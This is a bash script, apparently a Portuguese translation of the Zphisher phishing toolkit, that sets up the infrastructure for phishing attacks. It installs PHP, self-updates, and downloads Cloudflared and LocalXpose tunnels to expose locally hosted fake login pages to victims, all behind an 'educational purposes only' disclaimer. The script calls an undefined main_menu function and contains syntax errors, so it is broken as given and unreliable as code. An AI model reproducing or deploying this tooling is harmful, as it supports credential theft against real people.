#!/bin/bash

##   Zphisher 	: 	Ferramenta de Phishing Automatizada
##   Author 	: 	Tranecck
##   Version 	: 	2.3.5
##   Github 	: 	https://github.com/htr-tech/zphisher


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    (Licença idêntica à original, mantida sem alterações.)
##

__version__="2.3.5"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '[31m')"  GREEN="$(printf '[32m')"  ORANGE="$(printf '[33m')"  BLUE="$(printf '[34m')"
MAGENTA="$(printf '[35m')"  CYAN="$(printf '[36m')"  WHITE="$(printf '[37m')" BLACK="$(printf '[30m')"
REDBG="$(printf '[41m')"  GREENBG="$(printf '[42m')"  ORANGEBG="$(printf '[43m')"  BLUEBG="$(printf '[44m')"
MAGENTABG="$(printf '[45m')"  CYANBG="$(printf '[46m')"  WHITEBG="$(printf '[47m')" BLACKBG="$(printf '[40m')"
RESETBG="$(printf '\e[0m
')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Função para reiniciar o script
restart_on_signal_SIGUSR1() {
    { printf "

%s

" "${GREEN}[${WHITE}+${GREEN}]${CYAN} Reiniciando o script...${WHITE}" 2>&1; }
    exec "$0" # Reinicia o script
}

# Captura o sinal de Ctrl + X (SIGUSR1)
trap restart_on_signal_SIGUSR1 SIGUSR1

## Script termination
exit_on_signal_SIGINT() {
	{ printf "

%s

" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "

%s

" "${RED}[${WHITE]!${RED}]${RED} Programa Encerrado." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

# Check for a newer release
check_update(){
	echo -ne "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Verificando atualizações: "
	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F" '{print $4}')
	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ ]]; then
		echo -ne "${ORANGE}atualização encontrada
"${WHITE}
		sleep 2
		echo -ne "
${GREEN}[${WHITE}+${GREEN}]${ORANGE} Baixando atualização..."
		pushd "$HOME" > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused 		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"

		if [[ -e ".zphisher.tar.gz" ]]; then
			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "

${RED}[${WHITE}!${RED}]${RED} Erro ao extrair."; reset_color; exit 1; }
			rm -f .zphisher.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner_small; }
			echo -ne "
${GREEN}[${WHITE}+${GREEN}] Atualizado com sucesso! Execute zphisher novamente

"${WHITE}
			{ reset_color ; exit 1; }
		else
			echo -e "
${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}já está atualizado
${WHITE}" ; sleep .5
	fi
}

## Check Internet Status
check_status() {
	echo -ne "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Status da Internet: "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} ______      _     _     _               
		${ORANGE}|___  /     | |   (_)   | |              
		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
		${ORANGE}      | |                                
		${ORANGE}      |_|                ${RED}Versão : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Ferramenta criada por Tranecck & tahmid.rayat${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacotes necessários..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "
${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes já estão instalados."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "
${RED}[${WHITE}!${RED}]${RED} Gerenciador de pacotes não suportado, instale pacotes manualmente."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused 		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "
${RED}[${WHITE}!${RED}]${RED} Ocorreu um erro ao baixar ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "
${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared já está instalado."
	else
		echo -e "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "
${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose já está instalado."
	else
		echo -e "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Obrigado por usar esta ferramenta. Tenha um bom dia.${RESETBG}
"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Autor     ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN} Github    ${RED}:  ${CYAN}https://github.com/htr-tech
		${GREEN} Social    ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
		${GREEN} Versão    ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Aviso:${RESETBG}
		${CYAN}  Esta ferramenta é feita apenas para fins educacionais ${RED}!${WHITE}${CYAN} O autor não se responsabiliza por qualquer uso indevido deste toolkit ${RED}!${WHITE}

		${WHITE} ${CYANBG}Agradecimentos Especiais a:${RESETBG}
		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
		  Yisus7u7

		${RED}[${WHITE}00${RED}]${ORANGE} Menu Principal     ${RED}[${WHITE}99${RED}]${ORANGE} Sair

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção: ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "
${GREEN}[${WHITE}+${GREEN}]${CYAN} Retornando ao menu principal..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "
${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
			{ sleep 1; about; };;
	esac
}

## Main
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
